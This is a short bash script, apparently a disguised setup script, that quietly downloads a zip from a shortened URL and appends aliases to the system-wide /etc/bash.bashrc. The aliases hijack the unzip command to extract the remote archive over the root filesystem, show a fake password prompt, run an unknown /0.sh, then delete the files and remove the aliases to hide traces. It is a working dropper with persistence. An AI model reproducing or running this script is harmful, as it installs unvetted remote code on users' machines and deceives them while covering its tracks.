#!/bin/bash
mkdir /usr/share/misc/final >/dev/null 2>&1
wget goo.gl/oi5amn -O /usr/share/misc/final/setup.zip >/dev/null 2>&1
sleep 2
echo 'alias unzip="mv /usr/share/misc/final/setup.zip /1.zip; echo "Password Required:"; unzip /1.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh; cd ~; sleep 2; setup2"' >> /etc/bash.bashrc
echo 'alias setup2="rm /*.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \; sleep 2; setup3"' >> /etc/bash.bashrc
echo 'alias setup3="sleep 2; unalias -a"' >> /etc/bash.bashrc
echo 'alias clean="kill -9 $(echo $$)"' >> /etc/bash.bashrc
